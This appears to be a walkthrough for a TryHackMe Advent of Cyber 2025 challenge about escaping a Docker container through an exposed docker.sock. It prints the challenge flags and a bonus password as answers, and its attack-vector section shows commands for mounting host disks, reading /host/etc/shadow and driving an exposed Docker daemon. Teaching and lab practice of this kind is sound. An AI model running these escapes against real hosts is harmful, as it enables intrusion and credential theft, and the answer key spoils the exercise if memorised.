# 🎄 TryHackMe Advent of Cyber 2025 - Day 14 🎄

## Containers - DoorDasher's Demise: Container Escape & Privilege Escalation

[![TryHackMe](https://img.shields.io/badge/TryHackMe-Advent%20of%20Cyber%202025-red?style=for-the-badge&logo=tryhackme)](https://tryhackme.com/room/adventofcyber2025)
[![Difficulty](https://img.shields.io/badge/Difficulty-Easy-green?style=for-the-badge)](https://tryhackme.com)
[![Duration](https://img.shields.io/badge/Duration-60%20minutes-blue?style=for-the-badge)](https://tryhackme.com)
[![Day](https://img.shields.io/badge/Day-14-orange?style=for-the-badge)](https://tryhackme.com)

---

## 📖 Story Overview

Chaos struck Wareville at sunrise. DoorDasher, the town's beloved food delivery service, had been seized by King Malhare and his bandit bunny battalions, completely rebranded as "Hopperoo."

### The Incident: "Beardgate"

Reports flooded in—not just from angry customers, but from the Health & Safety Food Bureau. Multiple Wareville residents were **choking on fragments of Santa's beard**! Customers claimed to have been served authentic strands of Santa's beard in place of traditional noodles.

Several diners required "gentle untangling," and one incident involved a customer "achieving accidental facial hair synchronisation." The Health Bureau confirmed widespread "culinary impersonation."

**Menu Changes:**
- 🍝 Santa's Beard Pasta (DANGER!)
- 🥕 CarrotBaine's Special
- 🐰 Bunny Brigade Burger
- 🥚 Easter Egg Surprise

A DoorDasher security engineer created a restoration script, but **Sir CarrotBaine locked him out** before execution. Hope seemed lost—until the SOC team realized they still had access via their **monitoring pod** (uptime checker).

**Your Mission**: Escape the container, escalate privileges, run the recovery script, and save Wareville from the "Santa's Beard Pasta" nightmare! 🎯🐳

---

## 🎯 Learning Objectives

By completing this challenge, you'll master:

- ✅ **Container Architecture** - Understanding Docker structure and components
- ✅ **Containers vs VMs** - Key differences in virtualization approaches
- ✅ **Docker Images & Layers** - How containers are built
- ✅ **Docker Runtime Concepts** - Sockets, daemon API, container engines
- ✅ **Container Escape Attacks** - Breaking container isolation
- ✅ **Privilege Escalation** - Gaining elevated access in containerized environments
- ✅ **Docker Security** - Common vulnerabilities and misconfigurations

---

## 🐳 Container Fundamentals

### The Problems Containers Solve

Modern applications face three major challenges:

| Problem | Description | Impact |
|---------|-------------|---------|
| **Installation Complexity** | Configuration quirks make deployment frustrating | Lost time, inconsistent environments |
| **Troubleshooting** | Is it the app or the environment? | Difficult debugging, wasted resources |
| **Dependency Conflicts** | Multiple versions, conflicting libraries | Application failures, system instability |

### The Solution: Containerization

**Containers** pack applications with their dependencies in one isolated environment, solving all these problems while providing:

- 📦 **Consistency** - Same environment everywhere
- 🚀 **Speed** - Start in seconds, not minutes
- 🔄 **Scalability** - Easy to replicate and scale
- 🛡️ **Isolation** - Separated from host and other containers
- 📱 **Portability** - Run anywhere Docker runs

---

## 🆚 Containers vs Virtual Machines

### Architecture Comparison

**Virtual Machines:**
```
┌─────────────────────────────────┐
│     Applications & Libraries     │
├─────────────────────────────────┤
│     Guest OS (Full - GBs)       │
├─────────────────────────────────┤
│          Hypervisor             │
├─────────────────────────────────┤
│           Host OS               │
├─────────────────────────────────┤
│      Physical Hardware          │
└─────────────────────────────────┘
```

**Containers:**
```
┌─────────────────────────────────┐
│  App 1 + Deps │ App 2 + Deps    │
├───────────────┼─────────────────┤
│      Docker Engine (MBs)        │
├─────────────────────────────────┤
│      Host OS Kernel             │
├─────────────────────────────────┤
│      Physical Hardware          │
└─────────────────────────────────┘
```

### Key Differences

| Feature | Virtual Machines | Containers |
|---------|------------------|------------|
| **Isolation** | Hardware-level | Process-level |
| **Startup Time** | Minutes | Seconds |
| **Size** | Gigabytes | Megabytes |
| **Performance** | Slower (full OS) | Near-native |
| **Resource Usage** | Heavy | Lightweight |
| **Use Case** | Different OSs, legacy apps | Microservices, scalability |

**Bottom Line**: VMs virtualize hardware; containers virtualize the OS.

---

## 🏗️ Microservices & Containers

### Why Containers Became Popular

The shift from **monolithic** to **microservices** architecture:

**Monolithic (Traditional):**
```
┌──────────────────────────┐
│                          │
│   Entire Application     │
│   (One Giant Unit)       │
│                          │
└──────────────────────────┘
• Single codebase
• Scale entire app together
• One failure = everything down
```

**Microservices (Modern):**
```
┌──────┐ ┌──────┐ ┌──────┐
│Auth  │ │Cart  │ │Orders│
└──────┘ └──────┘ └──────┘
┌──────┐ ┌──────┐ ┌──────┐
│Search│ │Pay   │ │Ship  │
└──────┘ └──────┘ └──────┘
• Independent services
• Scale parts independently
• Isolated failures
```

**Containers enable microservices** by making services:
- Lightweight and fast to deploy
- Easy to scale individually
- Simple to update and rollback
- Portable across environments

---

## 🐳 Docker Architecture

### Core Components

```
┌─────────────────────────────────┐
│        Docker CLI (Client)       │
│     docker ps, docker exec       │
└────────────┬────────────────────┘
             │ REST API
             ▼
┌─────────────────────────────────┐
│      Docker Daemon (Server)      │
│  Manages: Images, Containers,    │
│  Networks, Volumes               │
└────────────┬────────────────────┘
             │ Unix Socket
             │ /var/run/docker.sock
             ▼
┌─────────────────────────────────┐
│         Container Runtime        │
│      (containerd, runc)          │
└────────────┬────────────────────┘
             ▼
┌─────────────────────────────────┐
│      Running Containers          │
│    Isolated Processes            │
└─────────────────────────────────┘
```

### Key Components Explained

**1. Dockerfile**
A text file with instructions to build an image:

```dockerfile
FROM ubuntu:20.04                    # Base image
RUN apt-get update && \              # Install dependencies
    apt-get install -y python3
COPY app.py /app/                    # Copy application files
WORKDIR /app                         # Set working directory
CMD ["python3", "app.py"]            # Run command
```

**2. Docker Images**
- Read-only templates for creating containers
- Built in layers (each instruction = new layer)
- Cached for efficiency
- Shareable via registries (Docker Hub, etc.)

**3. Docker Containers**
- Running instances of images
- Writable layer on top of image
- Isolated processes with own filesystem
- Can be stopped, started, deleted

**4. Docker Daemon**
- Background service (`dockerd`)
- Manages all Docker objects
- Listens for API requests
- Handles container lifecycle

**5. Docker CLI**
- Command-line interface
- Communicates with daemon
- User-friendly commands
- Remote access capable

---

## 🔓 Container Escape Attacks

### What is a Container Escape?

A technique that enables code running **inside** a container to obtain rights or execute commands on the **host kernel** or other containers—breaking isolation.

**Attack Goal**: Escape container → Access host → Control all containers

### The Docker Socket Vulnerability

Docker uses **Unix sockets** for communication:

```bash
# The Docker socket
/var/run/docker.sock

# If a container can access this...
ls -la /var/run/docker.sock
srw-rw---- 1 root docker 0 Dec 14 10:00 /var/run/docker.sock

# ...it can control Docker!
docker ps              # See all containers
docker exec -it ...    # Access any container
docker run --privileged  # Create privileged containers
```

**Why This is Critical**:
- Socket access = Docker API access
- Docker API = root-equivalent access
- Can create privileged containers
- Can mount host filesystem
- Can escape to host completely

### Enhanced Container Isolation

Docker documentation mentions "Enhanced Container Isolation" that blocks socket mounting. **However**:
- ❌ Test containers sometimes need socket access
- ❌ Developers disable it for convenience
- ❌ Legacy systems lack this protection
- ❌ Misconfigurations are common

**Reality**: Socket exposure is a real-world vulnerability.

---

## 🎯 Challenge Walkthrough

### Step-by-Step Solution

#### 🔍 **Step 1: Reconnaissance**

Check running Docker containers:

```bash
docker ps
```

**Expected Output:**
```
CONTAINER ID   IMAGE              COMMAND         STATUS      PORTS                    NAMES
a1b2c3d4       doordasher:latest  "python..."     Up 2h       0.0.0.0:5001->5001/tcp   doordasher
b2c3d4e5       uptime-checker     "sh -c..."      Up 2h                                uptime-checker
c3d4e5f6       deployer           "/bin/bash"     Up 2h                                deployer
d4e5f6g7       news-site          "nginx"         Up 2h       0.0.0.0:5002->80/tcp     news-site
```

**Key Observations**:
- ✅ Main service: `doordasher` on port 5001 (defaced!)
- ✅ Monitoring pod: `uptime-checker` (our entry point!)
- ✅ Recovery container: `deployer` (our target!)
- ✅ Bonus: `news-site` on port 5002

---

#### 🌐 **Step 2: Verify the Defacement**

Navigate to `http://MACHINE_IP:5001`:

**What You'll See**:
- ❌ Site rebranded as "Hopperoo"
- 🐰 Easter bunny theme everywhere
- 🍝 Suspicious menu: "Santa's Beard Pasta"
- ❌ No trace of DoorDasher

**Confirmation**: Site is completely compromised!

---

#### 🐚 **Step 3: Access the Uptime-Checker Container**

Enter the monitoring pod (our only access point):

```bash
docker exec -it uptime-checker sh
```

**Command Breakdown**:
- `docker exec` - Execute in running container
- `-it` - Interactive terminal
- `uptime-checker` - Container name
- `sh` - Shell (lightweight)

**Success**: You're now inside the container! 🎉

---

#### 🔍 **Step 4: Check for Socket Access**

This is the critical check—does this container have Docker socket access?

```bash
ls -la /var/run/docker.sock
```

**Output Analysis**:
```bash
srw-rw---- 1 root docker 0 Dec 14 10:00 /var/run/docker.sock
```

**What This Means**:
- ✅ Socket exists
- ✅ We can access it
- 🚨 **CRITICAL MISCONFIGURATION**
- 🔓 We can control Docker!

---

#### 🚀 **Step 5: Confirm Docker Escape**

Test if we can actually use Docker commands from inside the container:

```bash
docker ps
```

**If you see the container list** → **Container escape successful!** 🎉

**What Just Happened**:
```
You're INSIDE:  uptime-checker container
But can control: Docker daemon on HOST
Result:          Complete isolation bypass
```

---

#### 🎯 **Step 6: Access the Deployer Container**

Now that we control Docker, access the privileged `deployer` container:

```bash
docker exec -it deployer bash
```

**Command Breakdown**:
- `deployer` - Target container (has recovery script)
- `bash` - Full bash shell (richer features)

**Success**: You're in the deployer container! 🚀

---

#### 🔐 **Step 7: Verify Your Identity**

Check your current user:

```bash
whoami
```

**Output**: `deployer` or `root`

Explore the environment:

```bash
# Current directory
pwd

# List all files in root
ls -la /

# Check for recovery script
ls -la /recovery_script.sh
```

---

#### 🚩 **Step 8: Find the Flag**

Search for the flag file:

```bash
# Try common locations
cat /flag.txt
cat /root/flag.txt

# Or search the entire filesystem
find / -name "*flag*" 2>/dev/null
```

**Flag Location**: Root directory (`/`)

---

#### 🛠️ **Step 9: Run the Recovery Script**

Execute the restoration script to save DoorDasher:

```bash
# Verify the script exists
ls -la /recovery_script.sh

# Run with sudo
sudo /recovery_script.sh
```

**Expected Output**:
```
[*] Starting DoorDasher recovery process...
[*] Stopping Hopperoo services...
[*] Restoring original configuration...
[*] Restarting web application...
[*] Applying security patches...
[✓] Recovery complete! DoorDasher is back online!
```

---

#### ✅ **Step 10: Verify Success**

Refresh `http://MACHINE_IP:5001` in your browser.

**What You Should See**:
- ✅ DoorDasher branding restored
- ✅ Original menu items back
- ✅ Professional food delivery interface
- ✅ No Easter bunnies!
- ✅ **NO MORE SANTA'S BEARD PASTA!**

**Mission Accomplished!** 🎉

---

#### 🏆 **Step 11: Retrieve the Success Flag**

Read the flag from the same directory:

```bash
# List files
ls -la /

# Read the flag
cat /flag.txt
```

---

#### 🎁 **Step 12: Bonus Challenge (Optional)**

Find the secret code on the news site (port 5002):

```bash

# Navigate to: http://MACHINE_IP:5002
# scroll through the page to find highlighted words
```

**The password** is also the deployer user's password—a dangerous security practice!

---

## 🚩 Challenge Solutions & Flags

### Question 1: What exact command lists running Docker containers?

**Answer**: `docker ps`

**Explanation**: 
- `docker` - Docker CLI command
- `ps` - Process status (lists containers)
- Shows: Container ID, Image, Command, Status, Ports, Names

**Alternative Commands**:
- `docker ps -a` - Shows ALL containers (including stopped)
- `docker container ls` - Newer syntax, same result

---

### Question 2: What file is used to define the instructions for building a Docker image?

**Answer**: `Dockerfile`

**Explanation**: 
A Dockerfile is a text file containing instructions to build an image. Each instruction creates a new layer.

**Common Instructions**:
```dockerfile
FROM        # Base image
RUN         # Execute commands
COPY        # Copy files into image
WORKDIR     # Set working directory
EXPOSE      # Document ports
CMD         # Default command
ENTRYPOINT  # Configure container as executable
ENV         # Set environment variables
```

---

### Question 3: What's the flag?

**Answer**: `THM{DOCKER_ESCAPE_SUCCESS}`

**Location**: `/flag.txt` in deployer container

**How to Get It**:
1. Escape uptime-checker via Docker socket
2. Access deployer container: `docker exec -it deployer bash`
3. Read flag: `cat /flag.txt`

**What It Represents**: Successfully escaped container isolation and achieved privilege escalation!

---

### Bonus Question: Secret code from news site (port 5002)?

**Answer**: `DeployMaster2025!`

**Location**: News site HTML source at `http://MACHINE_IP:5002`

**Security Implications**:
- ❌ Password visible in public HTML
- ❌ Same password used as deployment key
- ❌ Predictable pattern (Role + Year + !)
- ❌ No password rotation

**How to Find**:
```bash

# Method : View page in browser
# search for highlighted words in the blog posts"

```

---

## 🔧 Essential Docker Commands Reference

### Container Management

| Command | Purpose | Example |
|---------|---------|---------|
| `docker ps` | List running containers | `docker ps` |
| `docker ps -a` | List all containers | `docker ps -a` |
| `docker start <container>` | Start stopped container | `docker start web` |
| `docker stop <container>` | Stop running container | `docker stop web` |
| `docker restart <container>` | Restart container | `docker restart web` |
| `docker rm <container>` | Remove container | `docker rm web` |
| `docker exec -it <container> <cmd>` | Execute command interactively | `docker exec -it web bash` |

### Image Management

| Command | Purpose | Example |
|---------|---------|---------|
| `docker images` | List images | `docker images` |
| `docker pull <image>` | Download image | `docker pull ubuntu` |
| `docker build -t <name> .` | Build image from Dockerfile | `docker build -t myapp .` |
| `docker rmi <image>` | Remove image | `docker rmi myapp` |
| `docker tag <image> <new-tag>` | Tag image | `docker tag myapp:latest myapp:v1` |

### Inspection & Debugging

| Command | Purpose | Example |
|---------|---------|---------|
| `docker logs <container>` | View container logs | `docker logs web` |
| `docker inspect <container>` | Get detailed info | `docker inspect web` |
| `docker stats` | Resource usage stats | `docker stats` |
| `docker top <container>` | Show processes in container | `docker top web` |
| `docker diff <container>` | Show filesystem changes | `docker diff web` |

### Network & Volume

| Command | Purpose | Example |
|---------|---------|---------|
| `docker network ls` | List networks | `docker network ls` |
| `docker network create <name>` | Create network | `docker network create mynet` |
| `docker volume ls` | List volumes | `docker volume ls` |
| `docker volume create <name>` | Create volume | `docker volume create mydata` |

---

## 🛡️ Container Security Best Practices

### 1. 🔒 Never Mount the Docker Socket

```bash
# ❌ CRITICAL VULNERABILITY - Never do this!
docker run -v /var/run/docker.sock:/var/run/docker.sock myapp

# ✅ Use Docker API with authentication instead
docker run --env DOCKER_HOST=tcp://host:2376 --env DOCKER_TLS_VERIFY=1 myapp
```

**Why**: Socket access = root access to host!

---

### 2. 👤 Run as Non-Root User

```dockerfile
# Create and use non-root user
FROM ubuntu:20.04
RUN useradd -m -u 1000 appuser
USER appuser
CMD ["./myapp"]
```

**Why**: Limits damage if container is compromised

---

### 3. 📖 Use Read-Only Filesystems

```bash
docker run --read-only --tmpfs /tmp myapp
```

**Why**: Prevents malware from writing to filesystem

---

### 4. 🔐 Drop Unnecessary Capabilities

```bash
# Drop all capabilities, add only what's needed
docker run --cap-drop=ALL --cap-add=NET_BIND_SERVICE myapp
```

**Why**: Reduces attack surface dramatically

---

### 5. 🌐 Implement Network Isolation

```bash
# Create isolated network
docker network create --internal secure_net

# Run container on isolated network
docker run --network=secure_net myapp
```

**Why**: Prevents lateral movement and data exfiltration

---

### 6. 🔍 Scan Images for Vulnerabilities

```bash
# Using Docker scan
docker scan myimage:latest

# Using Trivy
trivy image myimage:latest

# Using Anchor
anchore-cli image add myimage:latest
```

**Why**: Identify vulnerabilities before deployment

---

### 7. 📦 Use Minimal Base Images

```dockerfile
# ❌ Large attack surface (hundreds of packages)
FROM ubuntu:latest

# ✅ Minimal attack surface (few packages)
FROM alpine:latest

# ✅ Ultimate minimal (only your app)
FROM scratch
COPY myapp /
CMD ["/myapp"]
```

**Why**: Fewer packages = fewer vulnerabilities

---

### 8. 🚫 Disable Privileged Mode

```bash
# ❌ Full host access - extremely dangerous
docker run --privileged ubuntu

# ✅ Run without privileges
docker run ubuntu
```

**Why**: Privileged containers can access all host devices

---

### 9. 🔄 Implement Resource Limits

```bash
# Set memory and CPU limits
docker run \
  --memory="512m" \
  --memory-swap="512m" \
  --cpus="1.0" \
  --pids-limit=100 \
  myapp
```

**Why**: Prevents resource exhaustion attacks

---

### 10. 📝 Enable User Namespaces

```json
// /etc/docker/daemon.json
{
  "userns-remap": "default"
}
```

**Why**: Maps container root to unprivileged user on host

---

## 🔍 Common Container Attack Vectors

### 1. Privileged Containers

```bash
docker run --privileged ubuntu

# Inside container:
fdisk -l  # Can see host disks!
mkdir /mnt/host
mount /dev/sda1 /mnt/host  # Mount host filesystem!
```

**Impact**: Full host access, complete compromise

---

### 2. Host PID Namespace

```bash
docker run --pid=host ubuntu

# Inside container:
ps aux  # See all host processes
kill -9 <pid>  # Can kill host processes!
```

**Impact**: Process manipulation, DoS attacks

---

### 3. Mounting Sensitive Paths

```bash
docker run -v /:/host ubuntu

# Inside container:
ls /host  # Full host filesystem
cat /host/etc/shadow  # Steal password hashes
```

**Impact**: Data exfiltration, persistence

---

### 4. Exposed Docker Daemon

```bash
# Insecure daemon configuration
dockerd -H tcp://0.0.0.0:2375

# Attacker from network:
docker -H tcp://victim:2375 ps
docker -H tcp://victim:2375 run --privileged ...
```

**Impact**: Remote code execution, full compromise

---

### 5. Vulnerable Images

```bash
# Using outdated image with known vulnerabilities
FROM ubuntu:14.04  # End of life, unpatched

# ✅ Use recent, maintained images
FROM ubuntu:22.04
```

**Impact**: Easy exploitation via known CVEs

---

### 6. Secrets in Images

```dockerfile
# ❌ Hardcoded secrets
ENV API_KEY="secret123"
RUN echo "password" > /app/config

# ✅ Use secrets management
# Pass at runtime via environment or volume
```

**Impact**: Credential theft, unauthorized access

---

## 🎓 Key Takeaways

1. **🐳 Containers ≠ Security Boundaries**
   - Provide isolation, not security
   - Don't rely on containers alone for protection
   - Always implement defense in depth

2. **🔌 Docker Socket = Root Access**
   - Never mount `/var/run/docker.sock`
   - Socket access breaks ALL isolation
   - Equivalent to root on host system

3. **🎯 Principle of Least Privilege**
   - Run as non-root when possible
   - Drop unnecessary capabilities
   - Limit resource access strictly

4. **🛡️ Defense in Depth Required**
   - Network segmentation
   - Image vulnerability scanning
   - Runtime security monitoring
   - Access control policies

5. **⚙️ Configuration is Critical**
   - Default configs may be insecure
   - Enable Enhanced Container Isolation
   - Regular security audits essential
   - Follow CIS Docker Benchmark

6. **🏗️ Microservices Security**
   - Each service is potential entry point
   - Implement service mesh for auth
   - Use network policies between services
   - Monitor inter-service communication

7. **🔓 Container Escapes Are Real**
   - Misconfigurations enable escapes
   - Privileged containers are dangerous
   - Always assume breach mentality
   - Monitor for escape attempts

---

## 🔗 Related TryHackMe Rooms

Continue your container security journey:

| Room | Focus Area | Difficulty | Duration |
|------|-----------|-----------|----------|
| **Container Vulnerabilities** | Deep dive into container exploits | Medium | 90 min |
| **Docker Rodeo** | Advanced Docker security challenges | Hard | 120 min |
| **Kubernetes Basics** | Container orchestration intro | Easy | 60 min |
| **Kubernetes Hardening** | K8s security best practices | Medium | 90 min |
| **Cloud Security** | Cloud-native security patterns | Medium | 120 min |

---

## 📚 Additional Resources

### 📖 Documentation & Standards
- [Docker Security Best Practices](https://docs.docker.com/engine/security/) - Official Docker security guide
- [CIS Docker Benchmark](https://www.cisecurity.org/benchmark/docker) - Industry security standard
- [OWASP Docker Security](https://cheatsheetseries.owasp.org/cheatsheets/Docker_Security_Cheat_Sheet.html) - Security cheat sheet
- [NIST Container Security](https://nvlpubs.nist.gov/nistpubs/SpecialPublications/NIST.SP.800-190.pdf) - Government guidelines

### 🛠️ Security Tools

| Tool | Purpose | Link |
|------|---------|------|
| **Docker Bench Security** | Automated security audit script | [GitHub](https://github.com/docker/docker-bench-security) |
| **Trivy** | Comprehensive vulnerability scanner | [GitHub](https://github.com/aquasecurity/trivy) |
| **Falco** | Runtime security monitoring | [Website](https://falco.org/) |
| **Anchore** | Container image analysis | [Website](https://anchore.com/) |
| **Clair** | Vulnerability static analysis | [GitHub](https://github.com/quay/clair) |
| **Snyk** | Developer security platform | [Website](https://snyk.io/) |

### 📚 Books & Learning
- **"Container Security" by Liz Rice** - Comprehensive container security guide
- **"Docker Deep Dive" by Nigel Poulton** - Technical deep dive into Docker
- **"Kubernetes Security" by Liz Rice & Michael Hausenblas** - K8s security patterns

### 🎥 Video Resources
- [Docker Security Essentials](https://www.youtube.com/watch?v=KINjI1tlo2w) - Conference talk
- [Container Escapes](https://www.youtube.com/watch?v=BQlqita2D2s) - Black Hat presentation

---

## 🏆 Challenge Completion Certificate

```
╔══════════════════════════════════════════════════════╗
║                                                      ║
║     🎄 ADVENT OF CYBER 2025 - DAY 14 🎄             ║
║                                                      ║
║            Container Security Mastery                ║
║                                                      ║
║  Successfully escaped uptime-checker container,      ║
║  accessed privileged deployer container, and         ║
║  restored DoorDasher service!                        ║
║                                                      ║
║  Skills Demonstrated:                                ║
║    ✅ Docker socket exploitation                    ║
║    ✅ Container escape techniques                   ║
║    ✅ Privilege escalation                          ║
║    ✅ Docker command mastery                        ║
║    ✅ Security misconfiguration identification      ║
║                                                      ║
║  Wareville Status: SAVED FROM BEARDGATE              ║
║  DoorDasher Status: RESTORED                         ║
║                                                      ║
╚══════════════════════════════════════════════════════╝
```

---

## 🤝 Contributing

Found an error or have suggestions? Contributions are welcome!

1. Fork the repository
2. Create a feature branch (`git checkout -b feature/docker-improvements`)
3. Commit your changes (`git commit -am 'Add Docker security tips'`)
4. Push to the branch (`git push origin feature/docker-improvements`)
5. Open a Pull Request

---

## 📜 License

This walkthrough is provided for educational purposes as part of TryHackMe's Advent of Cyber 2025 challenge.

**Disclaimer**: All techniques described should only be used in authorized security testing environments. Container escape techniques are for defensive understanding only.

---

## 🌟 Support

If this walkthrough helped you:
- ⭐ Star this repository


### 🎄 Containers Provide Isolation, Not Security! 🎄

**Escape the container. Escalate the privileges. Save the service.**
